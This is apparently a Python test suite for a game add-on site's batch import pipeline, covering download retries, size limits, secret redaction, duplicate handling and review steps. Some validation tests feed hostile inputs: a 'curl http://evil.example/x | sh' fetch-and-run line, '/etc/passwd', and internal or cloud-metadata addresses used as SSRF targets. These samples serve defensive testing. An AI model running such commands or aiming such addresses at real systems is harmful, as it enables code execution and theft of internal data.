"""Batch import through the real application: submit -> acquire -> shared build -> draft -> explicit publish -> catalog -> download.

Remote sources are served by a controlled local server through the injected test transport (production SSRF checks still run); local
sources are real files in a temporary folder. Expected package contents are written down in the fixtures, not computed by the merge code.
"""
import contextlib
import hashlib
import io
import json
import os
import re
import shutil
import sqlite3
import stat
import threading
import time
import unittest
import zipfile
from pathlib import Path

import app as app_module
from app import app, get_db, jobs
from tests.nettest import FakeNet, Site
from tests.test_import_flow import FlowBase
from tests.test_pak_report import make_bsp, wav
from tests.test_zip_conversion import make_pak_bytes, parse_pak, write_zip

NOT_ROOT = hasattr(os, "geteuid") and os.geteuid() != 0
SVC = app_module.batch_service
HOST = "files.example.org"


def release(path: Path, tag: str, extra=()):
    """A release ZIP (embedded pak0 + loose files). Returns the effective content a correct conversion must produce."""
    bsp_a = make_bsp(worldspawn={"message": f"Map A {tag}"}, lighting=50)
    bsp_b = make_bsp(worldspawn={"message": f"Map B {tag}"})
    doc = f"Title : {tag}\nAuthor : Tester\n".encode()
    pak0 = make_pak_bytes([("maps/a.bsp", bsp_a), ("sound/x.wav", wav())])
    write_zip(path, [("pak0.pak", pak0), ("maps/b.bsp", bsp_b), ("readme.txt", doc), *extra])
    expected = {"maps/a.bsp": bsp_a, "sound/x.wav": wav(), "maps/b.bsp": bsp_b, "readme.txt": doc}
    expected.update(dict(extra))
    return expected


class BatchBase(FlowBase):
    def setUp(self):
        super().setUp()
        self.site = Site()
        self.addCleanup(self.site.close)
        self.net = FakeNet(self.site)
        self.sleeps: list[float] = []
        SVC.transport = self.net.kwargs(sleep=self.sleeps.append)
        self.addCleanup(lambda: setattr(SVC, "transport", {}))
        self.import_dir = self.tmp / "imports"
        self.import_dir.mkdir()
        app.config.update(IMPORT_ROOTS=str(self.import_dir), BATCH_RETRY_BASE=0.0, BATCH_READ_TIMEOUT=2.0, BATCH_CONNECT_TIMEOUT=2.0)
        self.n = 0

    # ---- remote helpers ----------------------------------------------------------------------------------------------------
    def host_release(self, path: str, tag: str, name: str | None = None, **serve_kw):
        self.n += 1
        z = self.tmp / f"rel{self.n}.zip"
        expected = release(z, tag)
        headers = {"Content-Disposition": f'attachment; filename="{name}"'} if name else None
        self.site.serve(path, z.read_bytes(), headers=headers, **serve_kw)
        return expected, z

    def url(self, path: str) -> str:
        return f"http://{HOST}{path}"

    def submit_urls(self, *urls: str, key: str | None = None, headers=None):
        return self.post("/batches/urls", {"urls": "\n".join(urls), "submit_key": key or f"k{time.time_ns()}"}, headers=headers)

    def batch_id(self, response) -> int:
        self.assertEqual(response.status_code, 302, response.get_data(as_text=True)[:500])
        return int(response.headers["Location"].rsplit("/", 1)[-1])

    def status(self, bid: int):
        res = self.c.get(f"/batches/{bid}/status")
        self.assertEqual(res.status_code, 200)
        return res.get_json()

    def states(self, bid: int):
        return [i["state"] for i in self.status(bid)["items"]]

    def settle(self, bid: int, timeout=30):
        self.assertTrue(jobs.wait_idle(timeout))
        return self.status(bid)

    def item_row(self, item_id: int):
        conn = get_db()
        try:
            return conn.execute("SELECT * FROM batch_items WHERE id = ?", (item_id,)).fetchone()
        finally:
            conn.close()

    def draft_count(self) -> int:
        conn = get_db()
        try:
            return conn.execute("SELECT COUNT(*) FROM addons").fetchone()[0]
        finally:
            conn.close()

    def pak_of(self, addon_id: str) -> dict:
        return parse_pak(Path(self.row(addon_id)["package_path"]))

    # ---- folder helpers ----------------------------------------------------------------------------------------------------
    def scan(self, sub="", recursive=False, pak=False, root=0):
        data = {"root": str(root), "subpath": sub}
        if recursive:
            data["recursive"] = "1"
        if pak:
            data["include_pak"] = "1"
        res = self.post("/batches/scan", data)
        self.assertEqual(res.status_code, 302)
        loc = res.headers["Location"]
        return loc.rsplit("/", 1)[-1].split("?")[0] if "/scan/" in loc else None, res

    def submit_folder(self, scan_id, selected=(), mode="selected", key=None):
        data = {"scan_id": scan_id, "mode": mode, "submit_key": key or f"f{time.time_ns()}", "selected": list(selected)}
        return self.post("/batches/folder", data)

    def folder_zip(self, rel: str, tag: str):
        p = self.import_dir / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        return release(p, tag)

    def tree_snapshot(self, root: Path):
        out = {}
        for p in sorted(root.rglob("*")):
            st = p.lstat()
            out[str(p.relative_to(root))] = (st.st_size, st.st_mtime_ns, st.st_mode, hashlib.sha256(p.read_bytes()).hexdigest() if p.is_file() and not p.is_symlink() else None)
        return out


class UrlBatchTests(BatchBase):
    def test_mixed_batch_one_failure_does_not_stop_the_others(self):
        good1, _ = self.host_release("/files/one", "One", "pungfx.zip")
        good2, _ = self.host_release("/dl", "Two", "second.zip")
        self.site.serve("/page", b"<html><body>log in</body></html>", ctype="text/html")
        self.site.serve("/junk", b"definitely not an archive")
        bid = self.batch_id(self.submit_urls(self.url("/files/one?sig=AAA"), self.url("/page"), self.url("/dl"), self.url("/junk"), self.url("/nothing-here")))
        st = self.status(bid)
        self.assertEqual([i["state"] for i in st["items"]], ["completed", "failed", "completed", "failed", "failed"])
        self.assertEqual(st["counts"], {"completed": 2, "failed": 3})
        msgs = [i["message"] for i in st["items"]]
        self.assertIn("direct download link", msgs[1])
        self.assertIn("not a ZIP archive", msgs[3])
        self.assertIn("not found (HTTP 404)", msgs[4])
        self.assertEqual(self.pak_of("pungfx"), good1)                          # logical content, checked independently of the storage
        self.assertEqual(self.pak_of("second"), good2)
        self.assertEqual(self.draft_count(), 2)
        self.assertEqual(self.stray_files(), [])                                # no staging directory left behind by any of the five

    def test_drafts_are_never_published_automatically(self):
        self.host_release("/p", "P", "mod.zip")
        self.submit_urls(self.url("/p"))
        row = self.row("mod")
        self.assertEqual((row["published"], row["draft"]), (0, 1))
        self.assertEqual(self.catalog(), [])
        self.assertEqual(list((Path(app.config["PUBLIC_ROOT"]) / "addons").glob("*")) if (Path(app.config["PUBLIC_ROOT"]) / "addons").exists() else [], [])
        self.assertEqual(self.c.get("/addons/mod.pak").status_code, 404)

    def test_end_to_end_source_to_draft_to_explicit_publish_to_download(self):
        expected, _ = self.host_release("/get", "E2E", "pungfx.zip")
        bid = self.batch_id(self.submit_urls(self.url("/get")))
        item = self.status(bid)["items"][0]
        self.assertEqual(item["state"], "completed")
        self.assertTrue(item["addon_url"].startswith("/addons/"))
        self.assertEqual(self.c.get(item["addon_url"]).status_code, 200)            # the draft link works
        self.assertEqual(self.pak_of("pungfx"), expected)
        self.publish("pungfx")                                                     # the explicit step
        entry = self.catalog()[0]
        self.assertEqual((entry["gamedir"], entry["download"]), ("pungfx", "addons/pungfx.pak"))
        served = self.c.get("/" + entry["download"]).data
        self.assertEqual(entry["size"], len(served))
        out = self.tmp / "served.pak"
        out.write_bytes(served)
        self.assertEqual(parse_pak(out), expected)                                  # what Ironwail would download has exactly the expected assets
        # and the source it came from is on record
        rec = json.loads(self.row("pungfx")["conversion_report"])
        self.assertEqual((rec["provenance"]["type"], rec["provenance"]["host"], rec["provenance"]["file"]), ("url", HOST, "pungfx.zip"))
        self.assertRegex(rec["provenance"]["imported_at"], r"^\d{4}-\d\d-\d\dT")
        self.assertEqual(rec["source_sha256"], self.row("pungfx")["source_sha256"])

    def test_extensionless_urls_and_content_disposition_names(self):
        self.host_release("/download", "A", "../../Evil Name.zip")
        self.host_release("/plain.bin", "B")
        self.host_release("/x/Third%20Mod", "C")
        bid = self.batch_id(self.submit_urls(self.url("/download?id=1"), self.url("/plain.bin"), self.url("/x/Third%20Mod")))
        self.assertEqual(self.states(bid), ["completed"] * 3)
        ids = sorted(r["addon_id"] for r in self._addons())
        self.assertEqual(ids, ["evil-name", "plain", "third-mod"])                  # IDs derived from sanitised names, never from raw path pieces

    def _addons(self):
        conn = get_db()
        try:
            return conn.execute("SELECT * FROM addons ORDER BY id").fetchall()
        finally:
            conn.close()

    def test_responses_without_content_length_and_chunked_responses(self):
        e1, _ = self.host_release("/nolen", "NoLen", "nolen.zip", length=False)
        e2, _ = self.host_release("/chunked", "Chunk", "chunked.zip", chunked=True)
        bid = self.batch_id(self.submit_urls(self.url("/nolen"), self.url("/chunked")))
        self.assertEqual(self.states(bid), ["completed", "completed"])
        self.assertEqual((self.pak_of("nolen"), self.pak_of("chunked")), (e1, e2))

    def test_download_size_limit_is_enforced_while_streaming(self):
        app.config["BATCH_MAX_DOWNLOAD_BYTES"] = 5000
        self.host_release("/big", "Big", "big.zip")                                 # announced length is over the limit
        self.site.endless("/endless", b"PK\x03\x04")                                # no length, never ends
        bid = self.batch_id(self.submit_urls(self.url("/big"), self.url("/endless")))
        items = self.status(bid)["items"]
        self.assertEqual([i["state"] for i in items], ["failed", "failed"])
        self.assertTrue(all("allowed" in i["message"] for i in items))
        self.assertEqual((self.draft_count(), self.stray_files()), (0, []))

    def test_html_pages_get_an_actionable_message_and_nothing_is_followed(self):
        self.site.serve("/share", b"<!DOCTYPE html><html><a href='http://127.0.0.1/x.zip'>download</a></html>", ctype="application/octet-stream")
        bid = self.batch_id(self.submit_urls(self.url("/share")))
        item = self.status(bid)["items"][0]
        self.assertEqual(item["state"], "failed")
        self.assertIn("A direct download link to the ZIP or PAK file is required", item["message"])
        self.assertEqual(self.net.connects, [((__import__("tests.nettest", fromlist=["PUBLIC_IP"]).PUBLIC_IP,), 80)])

    def test_a_corrupt_archive_is_rejected_by_the_shared_validators(self):
        self.site.serve("/trunc", b"PK\x03\x04" + b"\x00" * 40)                     # looks like a ZIP at the start, is not one
        bid = self.batch_id(self.submit_urls(self.url("/trunc")))
        item = self.status(bid)["items"][0]
        self.assertEqual(item["state"], "failed")
        self.assertIn("Package rejected", item["message"])
        self.assertEqual((self.draft_count(), self.stray_files()), (0, []))

    def test_internal_destinations_fail_the_item_without_a_connection(self):
        self.net.table["internal.example.org"] = ["10.0.0.9"]
        self.net.table["meta.example.org"] = ["169.254.169.254"]
        self.site.redirect("/hop", "http://169.254.169.254/latest/meta-data/")
        bid = self.batch_id(self.submit_urls("http://internal.example.org/x.zip", "http://meta.example.org/x.zip", self.url("/hop")))
        items = self.status(bid)["items"]
        self.assertEqual([i["state"] for i in items], ["failed"] * 3)
        self.assertTrue(all("public" in i["message"] for i in items), [i["message"] for i in items])
        self.assertEqual(len(self.net.connects), 1)                                 # only the public host that issued the redirect was ever contacted

    def test_syntax_problems_reject_the_whole_submission(self):
        res = self.submit_urls("https://good.example.org/a.zip", "ftp://x.example.org/b.zip", "/etc/passwd", "http://user:SECRETPW@h.example.org/c.zip",
                               "curl http://evil.example/x | sh", "http://127.0.0.1/a.zip", "http://0x7f.1/a")
        html = res.get_data(as_text=True)
        self.assertEqual(res.status_code, 400)
        for needle in ("Line 2", "Line 3", "Line 4", "Line 5", "Line 6", "Line 7", "nothing was queued", "Only http", "credentials", "not a web link"):
            self.assertIn(needle, html)
        self.assertNotIn("SECRETPW", html)
        self.assertEqual((self.draft_count(), self.site.requests), (0, []))
        conn = get_db()
        self.assertEqual(conn.execute("SELECT COUNT(*) FROM batches").fetchone()[0], 0)
        conn.close()

    def test_duplicate_urls_within_a_submission_are_imported_once(self):
        self.host_release("/one", "One", "one.zip")
        res = self.submit_urls(self.url("/one"), self.url("/one#fragment"), self.url("/one"), "HTTP://FILES.EXAMPLE.ORG/one")
        bid = self.batch_id(res)
        self.assertEqual(len(self.status(bid)["items"]), 1)
        self.assertEqual(self.hits("/one"), 1)
        self.assertIn("repeated link", self.c.get(f"/batches/{bid}").get_data(as_text=True) + res.get_data(as_text=True) + self._flashes())

    def _flashes(self):
        with self.c.session_transaction() as sess:
            return " ".join(m for _, m in sess.get("_flashes", []))

    def hits(self, path):
        return sum(1 for r in self.site.requests if r["path"].split("?", 1)[0] == path)

    def test_limits_on_batch_size_and_url_length(self):
        app.config["BATCH_MAX_ITEMS"] = 3
        res = self.submit_urls(*[f"https://h{i}.example.org/a.zip" for i in range(4)])
        self.assertEqual(res.status_code, 400)
        self.assertIn("Too many links: 4 (at most 3 per batch)", res.get_data(as_text=True))
        app.config["BATCH_MAX_URL_LENGTH"] = 100
        res = self.submit_urls("https://example.org/" + "a" * 200)
        self.assertEqual(res.status_code, 400)
        self.assertIn("longer than 100", res.get_data(as_text=True))
        self.assertEqual(self.post("/batches/urls", {"urls": "", "submit_key": "e"}).status_code, 400)
        self.assertEqual(self.post("/batches/urls", {"urls": "\n  \n\t\n", "submit_key": "e2"}).status_code, 400)

    def test_pending_queue_limit(self):
        app.config["BATCH_MAX_PENDING"] = 2
        conn = get_db()
        conn.execute("INSERT INTO batches (source_type, label, created_at) VALUES ('url','x',0)")
        for i in range(2):
            conn.execute("INSERT INTO batch_items (batch_id, position, source_type, source_key, source_display, state, created_at, updated_at) VALUES (1,?,?,?,?,?,0,0)",
                         (i, "url", f"k{i}", "d", "queued"))
        conn.close()
        res = self.submit_urls(self.url("/x"))
        self.assertEqual(res.status_code, 400)
        self.assertIn("queue is full", res.get_data(as_text=True))

    def test_double_submission_with_the_same_key_creates_one_batch(self):
        self.host_release("/one", "One", "one.zip")
        first = self.batch_id(self.submit_urls(self.url("/one"), key="same-key"))
        second = self.batch_id(self.submit_urls(self.url("/one"), key="same-key"))
        self.assertEqual(first, second)
        self.assertEqual((self.draft_count(), self.hits("/one")), (1, 1))

    # ---- retries --------------------------------------------------------------------------------------------------------------
    def test_transient_errors_are_retried_with_backoff_inside_the_download(self):
        ok_body = release(self.tmp / "ok.zip", "Flaky")
        body = (self.tmp / "ok.zip").read_bytes()

        def fail(h):
            h.send_response(503)
            h.send_header("Retry-After", "1")
            h.send_header("Content-Length", "0")
            h.end_headers()

        def good(h):
            h.send_response(200)
            h.send_header("Content-Length", str(len(body)))
            h.send_header("Content-Disposition", 'attachment; filename="flaky.zip"')
            h.end_headers()
            h.wfile.write(body)
        self.site.sequence("/flaky", [fail, fail, good])
        bid = self.batch_id(self.submit_urls(self.url("/flaky")))
        item = self.status(bid)["items"][0]
        self.assertEqual(item["state"], "completed")
        self.assertEqual((self.hits("/flaky"), sum(self.sleeps)), (3, 2))           # the server's Retry-After (1 s) was honoured twice
        self.assertEqual(self.pak_of("flaky"), ok_body)

    def test_bounded_retries_then_a_manual_retry_succeeds(self):
        self.site.serve("/down", b"", status=503)
        bid = self.batch_id(self.submit_urls(self.url("/down")))
        item = self.status(bid)["items"][0]
        self.assertEqual((item["state"], self.hits("/down")), ("failed", 3))
        self.assertIn("after 3 attempts", item["message"])
        # the problem is fixed upstream; the administrator retries
        expected, _ = self.host_release("/down", "Fixed", "fixed.zip")
        res = self.post(f"/batches/items/{item['id']}/retry")
        self.assertEqual(res.status_code, 302)
        item = self.status(bid)["items"][0]
        self.assertEqual((item["state"], item["attempts"]), ("completed", 2))
        self.assertEqual(self.pak_of("fixed"), expected)

    def test_permanent_failures_are_not_retried_automatically(self):
        for status in (403, 404, 410):
            self.site.serve(f"/s{status}", b"", status=status)
        bid = self.batch_id(self.submit_urls(*[self.url(f"/s{s}") for s in (403, 404, 410)]))
        self.assertEqual(self.states(bid), ["failed"] * 3)
        for status in (403, 404, 410):
            self.assertEqual(self.hits(f"/s{status}"), 1)
        self.assertEqual(self.sleeps, [])

    def test_retry_is_idempotent_and_never_creates_a_second_draft(self):
        self.site.serve("/later", b"", status=404)
        bid = self.batch_id(self.submit_urls(self.url("/later")))
        item_id = self.status(bid)["items"][0]["id"]
        self.host_release("/later", "Later", "later.zip")
        first = self.post(f"/batches/items/{item_id}/retry")
        second = self.post(f"/batches/items/{item_id}/retry")                      # a double click / a stale tab
        self.assertEqual((first.status_code, second.status_code), (302, 302))
        self.assertEqual((self.states(bid), self.draft_count(), self.hits("/later")), (["completed"], 1, 2))
        again = self.post(f"/batches/items/{item_id}/retry", headers={"X-Requested-With": "XMLHttpRequest"})
        self.assertEqual(again.status_code, 409)                                   # a completed item cannot be retried
        self.assertIn("only failed, cancelled or interrupted", again.get_json()["message"])

    def test_retry_all_failed(self):
        self.site.serve("/a", b"", status=404)
        self.site.serve("/b", b"", status=404)
        self.host_release("/ok", "Ok", "ok.zip")
        bid = self.batch_id(self.submit_urls(self.url("/a"), self.url("/b"), self.url("/ok")))
        self.assertEqual(self.states(bid), ["failed", "failed", "completed"])
        self.host_release("/a", "A", "a.zip")
        self.host_release("/b", "B", "b.zip")
        res = self.post(f"/batches/{bid}/retry")
        self.assertEqual(self.states(bid), ["completed"] * 3)
        self.assertEqual(self.draft_count(), 3)

    # ---- secrets ----------------------------------------------------------------------------------------------------------------
    def test_signed_urls_never_leak_into_pages_logs_messages_or_records(self):
        self.host_release("/ok", "Ok", "ok.zip")
        self.site.serve("/missing", b"", status=404)
        self.site.serve("/html", b"<html></html>", ctype="text/html")
        secret = "SIGNEDTOKEN0123456789"
        urls = [self.url(f"/ok?X-Amz-Signature={secret}&expires=999"), self.url(f"/missing?token={secret}"), self.url(f"/html?sig={secret}")]
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            bid = self.batch_id(self.submit_urls(*urls))
            pages = [self.c.get(f"/batches/{bid}").get_data(as_text=True), self.c.get(f"/batches/{bid}?fragment=1").get_data(as_text=True),
                     json.dumps(self.status(bid)), self.c.get("/batches").get_data(as_text=True), self.c.get("/dashboard").get_data(as_text=True)]
        self.assertNotIn(secret, out.getvalue())                                    # server log
        for page in pages:
            self.assertNotIn(secret, page)
        conn = get_db()
        try:
            for table in ("jobs", "addons"):
                dump = json.dumps([dict(r) for r in conn.execute(f"SELECT * FROM {table}")], default=str)
                self.assertNotIn(secret, dump, table)
            rows = conn.execute("SELECT state, message, source_display, source_url FROM batch_items ORDER BY id").fetchall()
        finally:
            conn.close()
        for r in rows:
            self.assertNotIn(secret, r["message"] + r["source_display"])
        # the full link is stored only where a retry needs it: not for the completed item
        self.assertEqual([r["source_url"] is not None for r in rows], [False, True, True])
        self.assertFalse(any("?" in r["source_display"] or "token=" in r["source_display"] for r in rows))     # the displayed form has no query string at all
        self.assertEqual(self.c.get(f"/batches/{bid}").headers["Referrer-Policy"], "no-referrer")

    def test_a_full_staging_area_fails_the_item_with_a_clear_message_and_keeps_the_rest(self):
        self.host_release("/a", "A", "a.zip")
        app.config["BATCH_STAGING_LIMIT_BYTES"] = 10
        bid = self.batch_id(self.submit_urls(self.url("/a")))
        item = self.status(bid)["items"][0]
        self.assertEqual(item["state"], "failed")
        self.assertIn("staging area is full or too small", item["message"])
        self.assertEqual(self.stray_files(), [])
        self.assertIn("BATCH_STAGING_LIMIT_GIB", item["message"])
        app.config["BATCH_STAGING_LIMIT_BYTES"] = 20 * 1024 ** 3
        self.post(f"/batches/items/{item['id']}/retry")
        self.assertEqual(self.states(bid), ["completed"])

    def test_staged_packages_waiting_for_review_count_against_the_staging_limit(self):
        z = self.tmp / "amb.zip"
        write_zip(z, [("moda/maps/a.bsp", make_bsp()), ("modb/maps/b.bsp", make_bsp())])
        self.site.serve("/amb", z.read_bytes())
        self.host_release("/ok", "Ok", "ok.zip")
        app.config["BATCH_STAGING_LIMIT_BYTES"] = len(z.read_bytes()) + 500
        bid = self.batch_id(self.submit_urls(self.url("/amb"), self.url("/ok")))
        states = self.states(bid)
        self.assertEqual(states[0], "awaiting_review")                                    # holds its staged copy
        self.assertEqual(states[1], "failed")                                             # no room left for a second staged package
        self.assertIn("staging area is full or too small", self.status(bid)["items"][1]["message"])

    def test_an_unexpected_error_whose_text_contains_the_link_does_not_leak_it(self):
        secret = "UNEXPECTEDSECRET987654"
        url = self.url(f"/boom?sig={secret}")

        def exploding_connector(addrs, port, timeout):
            raise RuntimeError(f"internal failure while requesting {url} with token {secret}")
        SVC.transport = {**self.net.kwargs(sleep=self.sleeps.append), "connector": exploding_connector}
        out = io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(out):
            bid = self.batch_id(self.submit_urls(url))
        item = self.status(bid)["items"][0]
        self.assertEqual(item["state"], "failed")
        self.assertIn("RuntimeError", item["message"])
        self.assertNotIn(secret, item["message"] + out.getvalue() + json.dumps(self.status(bid)) + self.c.get(f"/batches/{bid}").get_data(as_text=True))
        conn = get_db()
        jobs_dump = json.dumps([dict(r) for r in conn.execute("SELECT * FROM jobs")], default=str)
        conn.close()
        self.assertNotIn(secret, jobs_dump)
        self.assertEqual(self.stray_files(), [])

    def test_source_urls_are_kept_only_while_needed_and_expire(self):
        self.site.serve("/gone", b"", status=404)
        self.host_release("/ok", "Ok", "ok.zip")
        bid = self.batch_id(self.submit_urls(self.url("/gone?t=1"), self.url("/ok?t=2")))
        conn = get_db()
        self.assertEqual([r[0] for r in conn.execute("SELECT source_url FROM batch_items ORDER BY id")], [self.url("/gone?t=1"), None])
        conn.execute("UPDATE batches SET created_at = created_at - ?", (30 * 86400,))
        conn.close()
        SVC.recover()                                                               # startup housekeeping
        conn = get_db()
        self.assertEqual(conn.execute("SELECT COUNT(*) FROM batch_items").fetchone()[0], 0)    # the stored link went with the item
        self.assertEqual(conn.execute("SELECT COUNT(*) FROM batches").fetchone()[0], 0)
        conn.close()
        self.assertEqual(self.draft_count(), 1)                                     # drafts are not batch data and are untouched


class ConflictTests(BatchBase):
    def test_identical_content_is_skipped_and_can_be_imported_anyway_once(self):
        expected, z = self.host_release("/a", "Same", "mod.zip")
        self.site.serve("/b", z.read_bytes(), headers={"Content-Disposition": 'attachment; filename="other-name.zip"'})
        self.submit_urls(self.url("/a"))
        bid = self.batch_id(self.submit_urls(self.url("/b")))
        item = self.status(bid)["items"][0]
        self.assertEqual(item["state"], "skipped")
        self.assertIn("identical content was already imported as add-on 'mod'", item["message"])
        self.assertEqual(self.draft_count(), 1)
        self.assertEqual(self.stray_files(), [])
        self.assertEqual([c[0] for c in item["choices"]], ["import_anyway"])
        self.post(f"/batches/items/{item['id']}/resolve", {"choice": "import_anyway"})
        item = self.status(bid)["items"][0]
        self.assertEqual((item["state"], self.draft_count()), ("completed", 2))
        self.assertEqual(self.pak_of("other-name"), expected)
        again = self.post(f"/batches/items/{item['id']}/resolve", {"choice": "import_anyway"}, headers={"X-Requested-With": "XMLHttpRequest"})
        self.assertEqual((again.status_code, self.draft_count()), (409, 2))

    def test_same_id_with_different_content_needs_a_decision_and_nothing_is_overwritten(self):
        self.publish_existing("mod")
        live = self.c.get("/addons/mod.pak").data
        expected_b, _ = self.host_release("/b", "Different", "mod.zip")
        bid = self.batch_id(self.submit_urls(self.url("/b")))
        item = self.status(bid)["items"][0]
        self.assertEqual(item["state"], "needs_decision")
        self.assertIn("'mod' already exists", item["message"])
        self.assertEqual(sorted(c[0] for c in item["choices"]), ["new_id", "replace", "skip"])
        self.assertEqual((self.draft_count(), self.c.get("/addons/mod.pak").data), (1, live))     # staged only; the published one is untouched
        self.post(f"/batches/items/{item['id']}/resolve", {"choice": "new_id"})
        item = self.status(bid)["items"][0]
        self.assertEqual(item["state"], "completed")
        self.assertEqual(self.pak_of("mod-2"), expected_b)
        self.assertEqual(self.c.get("/addons/mod.pak").data, live)

    def publish_existing(self, addon_id):
        z = self.tmp / "existing.zip"
        self.existing_expected = release(z, "Existing")
        data = {"title": addon_id, "addon_id": addon_id, "gamedir": addon_id, "author": "T", "date": "2026/10/16", "description": "d",
                "package": (z.open("rb"), "existing.zip")}
        self.post("/addons/new", data)
        jobs.wait_idle(20)
        self.publish(addon_id)

    def test_skip_choice_discards_the_staged_upload(self):
        self.publish_existing("mod")
        self.host_release("/b", "Different", "mod.zip")
        bid = self.batch_id(self.submit_urls(self.url("/b")))
        item = self.status(bid)["items"][0]
        self.post(f"/batches/items/{item['id']}/resolve", {"choice": "skip"})
        self.assertEqual((self.states(bid), self.draft_count(), self.stray_files()), (["skipped"], 1, []))

    def test_replace_choice_goes_through_the_review_page_and_keeps_the_published_copy_until_republished(self):
        self.publish_existing("mod")
        live = self.c.get("/addons/mod.pak").data
        old_pk_bytes = Path(self.row("mod")["package_path"]).read_bytes()
        expected_b, _ = self.host_release("/b", "Replacement", "mod.zip")
        bid = self.batch_id(self.submit_urls(self.url("/b")))
        item = self.status(bid)["items"][0]
        self.post(f"/batches/items/{item['id']}/resolve", {"choice": "replace"})
        item = self.status(bid)["items"][0]
        self.assertEqual(item["state"], "awaiting_review")
        self.assertTrue(item["review_url"].startswith("/imports/"))
        page = self.c.get(item["review_url"]).get_data(as_text=True)
        self.assertIn("Review the conversion", page)
        self.assertEqual(Path(self.row("mod")["package_path"]).read_bytes(), old_pk_bytes)          # nothing replaced yet
        token = item["review_url"].rsplit("/", 1)[-1]
        res = self.post(f"/imports/{token}/build", {})
        self.assertEqual(self.status(bid)["items"][0]["state"], "completed")
        self.assertEqual(self.pak_of("mod"), expected_b)                                           # the add-on's package is now the new content
        self.assertEqual(self.c.get("/addons/mod.pak").data, live)                                 # ...but the public copy is the old one until it is published again
        self.assertEqual(self.draft_count(), 1)                                                    # replaced, not duplicated
        self.publish("mod")
        self.assertNotEqual(self.c.get("/addons/mod.pak").data, live)

    def test_a_failed_replacement_preserves_the_published_version(self):
        self.publish_existing("mod")
        live = self.c.get("/addons/mod.pak").data
        old = Path(self.row("mod")["package_path"]).read_bytes()
        self.host_release("/b", "Replacement", "mod.zip")
        bid = self.batch_id(self.submit_urls(self.url("/b")))
        item = self.status(bid)["items"][0]
        self.post(f"/batches/items/{item['id']}/resolve", {"choice": "replace"})
        token = self.status(bid)["items"][0]["review_url"].rsplit("/", 1)[-1]
        self.post(f"/imports/{token}/build", {"root": "no-such-folder"})                           # the replacement build fails
        self.assertEqual(self.c.get("/addons/mod.pak").data, live)
        self.assertEqual(Path(self.row("mod")["package_path"]).read_bytes(), old)
        self.assertEqual(self.catalog()[0]["size"], len(live))
        self.assertEqual(self.states(bid), ["awaiting_review"])                                    # still reviewable; nothing was lost

    def test_content_that_changed_at_the_same_url_is_flagged_not_assumed_equal(self):
        self.host_release("/stable", "V1", "pack.zip")
        self.submit_urls(self.url("/stable?v=1"))
        self.assertIn("pack", [r["addon_id"] for r in self._addons()])
        self.host_release("/stable", "V2 with new content", "pack.zip")
        bid = self.batch_id(self.submit_urls(self.url("/stable?v=1")))
        item = self.status(bid)["items"][0]
        self.assertEqual(item["state"], "needs_decision")
        self.assertIn("changed since it was imported", item["message"])
        self.assertIn("replace", [c[0] for c in item["choices"]])

    def _addons(self):
        conn = get_db()
        try:
            return conn.execute("SELECT * FROM addons ORDER BY id").fetchall()
        finally:
            conn.close()

    def test_different_sources_that_convert_to_the_same_package_are_not_duplicated(self):
        pak0 = make_pak_bytes([("maps/a.bsp", make_bsp()), ("sound/x.wav", wav())])
        a, b = self.tmp / "a.zip", self.tmp / "b.zip"
        write_zip(a, [("pak0.pak", pak0), ("maps/b.bsp", make_bsp(size=50_000)), ("readme.txt", b"hi")])
        with zipfile.ZipFile(b, "w", zipfile.ZIP_DEFLATED) as zf:                                 # other order and compression: different source bytes
            zf.writestr("readme.txt", b"hi")
            zf.writestr("maps/b.bsp", make_bsp(size=50_000))
            zf.writestr("pak0.pak", pak0)
        self.assertNotEqual(a.read_bytes(), b.read_bytes())
        self.site.serve("/a", a.read_bytes(), headers={"Content-Disposition": 'attachment; filename="alpha.zip"'})
        self.site.serve("/b", b.read_bytes(), headers={"Content-Disposition": 'attachment; filename="beta.zip"'})
        self.submit_urls(self.url("/a"))
        bid = self.batch_id(self.submit_urls(self.url("/b")))
        item = self.status(bid)["items"][0]
        self.assertEqual(item["state"], "skipped")
        self.assertIn("identical to add-on 'alpha'", item["message"])
        self.assertEqual((self.draft_count(), self.stray_files()), (1, []))
        self.post(f"/batches/items/{item['id']}/resolve", {"choice": "import_anyway"})
        self.assertEqual((self.states(bid), self.draft_count()), (["completed"], 2))


class ReviewTests(BatchBase):
    def ambiguous(self, path="/amb"):
        z = self.tmp / "amb.zip"
        a, b = make_bsp(worldspawn={"message": "A"}), make_bsp(worldspawn={"message": "B"})
        write_zip(z, [("moda/maps/a.bsp", a), ("modb/maps/b.bsp", b)])
        self.site.serve(path, z.read_bytes(), headers={"Content-Disposition": 'attachment; filename="two-mods.zip"'})
        return a, b

    def test_a_release_that_needs_a_decision_is_kept_reviewable_and_the_download_is_reused(self):
        a, b = self.ambiguous()
        bid = self.batch_id(self.submit_urls(self.url("/amb")))
        item = self.status(bid)["items"][0]
        self.assertEqual(item["state"], "awaiting_review")
        self.assertIn("ambiguous root mapping", item["message"])
        self.assertEqual(self.draft_count(), 0)
        page = self.c.get(item["review_url"]).get_data(as_text=True)
        self.assertIn("ambiguous root mapping", page)
        self.assertIn('value="moda"', page)
        token = item["review_url"].rsplit("/", 1)[-1]
        self.post(f"/imports/{token}/build", {"root": "modb"})
        self.assertEqual(self.status(bid)["items"][0]["state"], "completed")
        self.assertEqual(self.pak_of("two-mods"), {"maps/b.bsp": b})                                # the administrator's choice, applied to the staged copy
        self.assertEqual(sum(1 for r in self.site.requests if r["path"] == "/amb"), 1)              # downloaded once, never again
        self.assertEqual(self.stray_files(), [])

    def test_discarding_a_review_cancels_the_item_and_removes_the_staged_file(self):
        self.ambiguous()
        bid = self.batch_id(self.submit_urls(self.url("/amb")))
        item = self.status(bid)["items"][0]
        self.post(f"/batches/items/{item['id']}/cancel")
        self.assertEqual((self.states(bid), self.stray_files(), self.draft_count()), (["cancelled"], [], 0))

    def test_a_review_discarded_from_the_review_page_is_reflected_in_the_batch(self):
        self.ambiguous()
        bid = self.batch_id(self.submit_urls(self.url("/amb")))
        token = self.status(bid)["items"][0]["review_url"].rsplit("/", 1)[-1]
        self.post(f"/imports/{token}/cancel")
        item = self.status(bid)["items"][0]
        self.assertEqual((item["state"], "discarded" in item["message"]), ("cancelled", True))

    def test_reviews_survive_a_restart(self):
        self.ambiguous()
        bid = self.batch_id(self.submit_urls(self.url("/amb")))
        app_module.startup_cleanup()
        item = self.status(bid)["items"][0]
        self.assertEqual(item["state"], "awaiting_review")
